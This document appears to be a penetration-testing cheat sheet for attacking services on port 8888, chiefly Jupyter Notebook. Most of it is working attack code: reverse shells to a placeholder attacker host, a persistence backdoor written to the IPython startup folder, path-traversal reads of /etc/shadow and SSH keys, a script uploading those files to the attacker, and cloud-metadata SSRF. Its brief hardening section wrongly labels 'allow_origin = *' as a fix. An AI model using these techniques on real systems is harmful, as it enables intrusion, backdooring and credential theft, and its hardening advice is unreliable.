# HTTP ALTERNATIVE ENUMERATION (Port 8888)

## SERVICE OVERVIEW
```
Port 8888 is commonly used for:
- Alternative HTTP servers
- Jupyter Notebook (default port)
- Alternative admin panels
- Web proxies
- Testing/development servers
- Application servers
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p8888 <IP>                             # Service/Version detection
curl -I http://<IP>:8888                         # HTTP headers
wget --server-response --spider http://<IP>:8888 2>&1 | grep "Server:"
nc -nv <IP> 8888                                 # Manual banner grab
```

## WEB SERVER DETECTION
```bash
# Identify web server/application
whatweb http://<IP>:8888 -a 3                    # Aggressive fingerprinting
curl -I http://<IP>:8888 | grep -i "server\|x-powered"

# Common applications on 8888:
# - Jupyter Notebook/JupyterLab
# - Alternative HTTP servers
# - Proxy servers
# - Application servers
# - Admin panels
```

## JUPYTER NOTEBOOK DETECTION & EXPLOITATION
```bash
# Detect Jupyter Notebook
curl http://<IP>:8888 | grep -i jupyter
curl -I http://<IP>:8888 | grep -i jupyter
curl http://<IP>:8888/tree                       # Jupyter file browser

# Check if authentication required
curl http://<IP>:8888/login

# Common Jupyter paths
/tree                                            # File browser
/terminals/1                                     # Terminal access
/notebooks/                                      # Notebook directory
/api                                             # API endpoints
/login                                           # Login page
```

## JUPYTER NOTEBOOK EXPLOITATION (No Password)
```bash
# If Jupyter has no password (common misconfiguration)
curl http://<IP>:8888/tree                       # Access file browser

# Create new terminal (RCE!)
curl -X POST http://<IP>:8888/api/terminals

# Execute commands via terminal
curl http://<IP>:8888/terminals/websocket/1

# Create new notebook (RCE)
curl -X POST http://<IP>:8888/api/notebooks/Untitled.ipynb

# Upload malicious notebook
# Notebooks can execute Python code on the server!
```

## JUPYTER NOTEBOOK TOKEN BYPASS
```bash
# Jupyter uses tokens for authentication
# Format: http://<IP>:8888/?token=<token>

# Check if token in URL or cookies
curl -v http://<IP>:8888/tree 2>&1 | grep -i token

# Brute force token (if weak)
# Tokens are typically long random strings, but might be weak

# Common weak tokens to try
curl http://<IP>:8888/?token=admin
curl http://<IP>:8888/?token=password
curl http://<IP>:8888/?token=jupyter
curl http://<IP>:8888/?token=test
```

## JUPYTER NOTEBOOK RCE
```bash
# If you gain access to Jupyter Notebook, you have RCE!

# Method 1: Create new notebook and execute code
# In notebook cell:
import os
os.system('id')
os.system('whoami')
os.system('nc -e /bin/bash <attacker_IP> 4444')

# Method 2: Terminal access
# Navigate to /terminals/1
# Execute shell commands directly

# Method 3: Use API
curl -X POST http://<IP>:8888/api/terminals
# Then connect to terminal websocket
```

## DIRECTORY ENUMERATION
```bash
# Directory brute forcing
gobuster dir -u http://<IP>:8888 -w /usr/share/wordlists/dirb/common.txt -t 50
ffuf -u http://<IP>:8888/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Common paths
/admin
/console
/manager
/api
/static
/files
/uploads
```

## PROXY DETECTION
```bash
# Test if it's an HTTP proxy
curl -x http://<IP>:8888 http://www.google.com
wget -e use_proxy=yes -e http_proxy=<IP>:8888 http://www.google.com

# Nmap proxy detection
nmap -p8888 --script http-open-proxy <IP>
```

## API ENDPOINT DISCOVERY
```bash
# Common API paths
curl http://<IP>:8888/api
curl http://<IP>:8888/api/v1
curl http://<IP>:8888/api/v2
curl http://<IP>:8888/rest
curl http://<IP>:8888/api/contents                # Jupyter API
curl http://<IP>:8888/api/sessions                # Jupyter sessions

# Jupyter-specific API
curl http://<IP>:8888/api/kernels                # Active kernels
curl http://<IP>:8888/api/terminals              # Active terminals
curl http://<IP>:8888/api/spec.yaml              # API spec
```

## VULNERABILITY SCANNING
```bash
# Nikto scan
nikto -h http://<IP>:8888

# Nmap scripts
nmap -p8888 --script http-enum <IP>
nmap -p8888 --script http-vuln-* <IP>
nmap -p8888 --script vuln <IP>

# Known vulnerabilities
searchsploit jupyter
searchsploit "jupyter notebook"
```

## DEFAULT CREDENTIALS
```bash
# Jupyter Notebook typically doesn't have default credentials
# But check for weak configurations:
# - No password set
# - Empty token
# - Predictable token

# Other services on 8888 might have:
admin:admin
admin:password
root:root
```

## METASPLOIT MODULES
```bash
msfconsole
use auxiliary/scanner/http/jupyter_login         # Jupyter scanner (if exists)
use auxiliary/scanner/http/dir_scanner           # Directory scanner
use auxiliary/gather/jupyter_notebook_exec       # Jupyter RCE (if exists)
set RHOSTS <IP>
set RPORT 8888
run
```

## JUPYTER NOTEBOOK PERSISTENCE
```bash
# After gaining access to Jupyter, establish persistence

# Create startup script
# In Jupyter notebook:
import os
startup_script = """
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('<attacker_IP>',4444))
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
subprocess.call(['/bin/sh','-i'])
"""

# Write to startup directory
with open('/home/user/.ipython/profile_default/startup/backdoor.py', 'w') as f:
    f.write(startup_script)
```

## SENSITIVE FILE ACCESS
```bash
# If Jupyter has file access, read sensitive files

# Via Jupyter tree interface:
http://<IP>:8888/tree/../../etc/passwd

# Via API:
curl http://<IP>:8888/api/contents/../../etc/passwd

# Common files to check:
/etc/passwd
/etc/shadow
/home/user/.ssh/id_rsa
/root/.ssh/id_rsa
/.env
/var/www/html/config.php
```

## COMMON MISCONFIGURATIONS
```
☐ Jupyter Notebook without password             # Direct RCE
☐ Jupyter accessible from internet              # Should be localhost only
☐ Weak or predictable token                     # Easy to guess
☐ No authentication                              # Open access
☐ Directory listing enabled                      # Information disclosure
☐ Running as root                                # Privilege escalation
☐ Access to sensitive directories                # Data breach
☐ CORS misconfiguration                          # Cross-origin attacks
```

## QUICK WIN CHECKLIST
```
☐ Check for Jupyter Notebook
☐ Test for authentication bypass (no password)
☐ Check if token is required
☐ Test weak tokens
☐ Look for /tree endpoint (file browser)
☐ Check /terminals endpoint (shell access)
☐ Test API endpoints
☐ Check for directory listing
☐ Test if running as proxy
☐ Search for known Jupyter vulnerabilities
```

## ONE-LINER FULL ENUMERATION
```bash
# Comprehensive scan
nmap -sV -p8888 --script "http-*" -oA http_8888_enum <IP>

# Quick Jupyter check
curl http://<IP>:8888/tree -L | grep -i jupyter

# Test authentication
curl -I http://<IP>:8888/tree
```

## POST-EXPLOITATION (Jupyter Notebook)
```bash
# After gaining access to Jupyter Notebook

# 1. Information gathering
import os
os.system('whoami')
os.system('id')
os.system('uname -a')
os.system('cat /etc/passwd')

# 2. Establish reverse shell
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('<attacker_IP>',4444))
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
subprocess.call(['/bin/sh','-i'])

# 3. Read sensitive files
with open('/etc/shadow','r') as f:
    print(f.read())

# 4. Enumerate network
import subprocess
subprocess.run(['netstat','-tulpn'])

# 5. Download files
import requests
files = ['/etc/passwd', '/etc/shadow', '/home/user/.ssh/id_rsa']
for file in files:
    try:
        with open(file,'rb') as f:
            requests.post('http://<attacker_IP>/upload', files={'file': f})
    except:
        pass
```

## JUPYTER NOTEBOOK CONFIGURATION FILES
```bash
# Configuration files (if you have file system access)
~/.jupyter/jupyter_notebook_config.py            # Main config
~/.jupyter/jupyter_notebook_config.json          # JSON config
~/.jupyter/nbconfig/                             # Notebook config
~/.local/share/jupyter/runtime/                  # Runtime info

# Look for tokens in:
~/.jupyter/jupyter_notebook_config.py
# Search for: c.NotebookApp.token
```

## ADVANCED TECHNIQUES
```bash
# Jupyter nbconvert for code execution
# If nbconvert is installed, can execute arbitrary code

# SSRF via Jupyter
# Jupyter can make HTTP requests
import requests
requests.get('http://169.254.169.254/latest/meta-data/')  # AWS metadata

# Pivot through Jupyter
# Use Jupyter as SOCKS proxy or port forward
import socket
# Create reverse tunnel

# Extract credentials from notebooks
# Search for passwords, API keys in .ipynb files
grep -r "password\|api_key\|secret" ~/.local/share/jupyter/

# Jupyter extension exploitation
# Malicious Jupyter extensions can provide backdoors
```

## DETECTION & PREVENTION
```bash
# Secure Jupyter configuration:
jupyter notebook --generate-config

# Edit ~/.jupyter/jupyter_notebook_config.py:
c.NotebookApp.ip = '127.0.0.1'                   # Localhost only
c.NotebookApp.password = 'hashed_password'       # Set strong password
c.NotebookApp.token = 'random_strong_token'      # Strong token
c.NotebookApp.open_browser = False               # Don't auto-open
c.NotebookApp.allow_origin = '*'                 # Fix to specific origin

# Use HTTPS:
c.NotebookApp.certfile = '/path/to/cert.pem'
c.NotebookApp.keyfile = '/path/to/key.pem'
```

## JUPYTER LAB VS JUPYTER NOTEBOOK
```
Jupyter Notebook:
- Classic interface
- /tree endpoint
- Simpler UI

JupyterLab:
- Next-generation interface
- /lab endpoint
- More features
- Same security concerns
- RCE through code execution

Both are vulnerable if misconfigured!
```
